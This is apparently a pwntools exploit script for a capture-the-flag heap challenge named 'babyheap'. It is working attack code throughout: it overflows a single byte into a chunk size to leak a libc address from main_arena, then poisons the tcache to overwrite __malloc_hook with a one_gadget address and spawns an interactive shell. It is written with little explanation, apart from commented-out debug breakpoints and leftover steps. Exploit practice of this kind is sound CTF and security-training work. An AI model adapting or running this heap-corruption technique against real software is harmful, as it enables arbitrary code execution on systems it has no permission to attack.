from pwn import *

elf = ELF('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r = process('./babyheap')

# 0x7f20f00acbe0 <main_arena+96>; 0x7f20f00acbe0 - libc_base = 0x1978a0
main_arena_offset = 0x1bcbe0
system_offset = libc.sym['system']
free_hook_offset = libc.symbols['__free_hook'] # 1838e
malloc_hook_offset = libc.symbols['__malloc_hook']

#system_offset = 0x023560
#free_hook_offset = 0x01838e # 1838e
#malloc_hook_offset = 0x197830
one_gadget = 0xe92a7

def malloc(size, data):
    r.sendlineafter('> ', 'M')
    r.sendlineafter('> ', str(size))
    r.sendlineafter('> ', data)

def free(index):
    r.sendlineafter('> ', 'F')
    r.sendlineafter('> ', str(index))

def show(index):
    r.sendlineafter('> ', 'S')
    r.sendlineafter('> ', str(index))
    return r.recvuntil('-----Yet Another Babyheap!-----', drop=True)

def pack_and_remove_nulls(addr):
    packet = p64(addr)
    first_null = packet.index(b'\x00')
    return packet[:first_null]

#gdb.attach(r, gdbscript='c')

for i in range(7):
    # index 7 will be our unsorted chunk
    malloc(0xf8, "AAAA")


# input('BK1')

malloc(1, 'B') # unsorted chunk
malloc(1, 'C') # another chunk to avoid consolidating
# malloc(1, 'D') # another chunk to avoid consolidating

for i in range(7):
    free(i)

# input('BK1')
free(7) # unsorted chunk
# input('BK2')
free(8) # another chunk to avoid consolidatin
# free(9) # another chunk to avoid consolidatin

# input('BK3')

malloc(0xf8, "A"*0xf8) # index 6 -> 7 tcache
# input('BK4')

malloc(0xf8, "A"*0xf8 + '\x81')
# input('BK5')

free(0)
# input('BK6')

malloc(0x178, 'A'*(0xf8+8))
# input('BK7')

# r.interactive()

leak = show(0)[256:-1]
log.info('Got leaked addr...')
main_arena_p96_addr = u64(leak.ljust(8, b'\x00'))
log.info(f'main_arena+96 addr: {hex(main_arena_p96_addr)}')

libc_base = main_arena_p96_addr - main_arena_offset
libc.address = libc_base
log.info(f'Libc base addr: {hex(libc_base)}')

system_addr = libc_base + system_offset
log.info(f'Libc system addr:            {hex(system_addr)}')
log.info(f'Libc system addr (pwntools): {hex(libc.sym["system"])}')

malloc_hook_addr = libc_base + malloc_hook_offset
log.info('malloc hook offset (pwntools): ' + hex(libc.sym['__malloc_hook']))
log.info('malloc hook offset: ' + hex(malloc_hook_offset))
log.info(f'__malloc_hook addr: {hex(malloc_hook_addr)}')

one_gadget_addr = one_gadget + libc_base
log.info(f'one_gadget addr: {hex(one_gadget_addr)}')

#input('BK')

free(0)
free(1)

# input('BK2')

malloc(1, 'A') # 0
malloc(0xf8, 'BBBB') # 1
malloc(0xf8, 'C'*0xf8 + '\x81') # 2

# input('BK3')


free(0)
free(1)

# input('BK4')

# this is a mess omg hkjkjk
tcache_next_addr_overwrite  = ('\x44'*0xf8).encode()
tcache_next_addr_overwrite += ('\x01\x01').encode() # chunk size
tcache_next_addr_overwrite += ('\x41'*6).encode()

malloc_hook_addr_pk = p64(malloc_hook_addr)
fnbi = malloc_hook_addr_pk.index(b"\x00")
malloc_hook_addr_no_null_bytes = malloc_hook_addr_pk[:fnbi]

tcache_next_addr_overwrite += malloc_hook_addr_no_null_bytes

print(repr(malloc_hook_addr_no_null_bytes))
malloc(0x178, tcache_next_addr_overwrite) # write __malloc_hook addr

# print(r.recvall())

# input('BK5')

# now, two malloc to rewrite __malloc_hook
malloc(0xf8, 'PWN')
# input('BK6')

malloc(0xf8, p64(one_gadget_addr)[0:6])

#input('BK7')

# now the magic malloc
r.sendlineafter('> ', 'M')
r.sendlineafter('> ', '128')

log.success('PWNED!')

r.interactive()


# malloc(0xf8, 'AAAA')
# malloc(0xf8, 'BBBB')
# malloc(0xf8, 'CCCC')

# input('***BK1***')

# free(0) # free A
# malloc(0xf8, 'A'*0xf8 + '\x81') # Alloc memory so chunk A will be used and allocation will overwrite chunk size of B

# input('***BK2***')

# free(1)
# malloc(0x178, 'B'*0xf8)

# input('***BK3***')

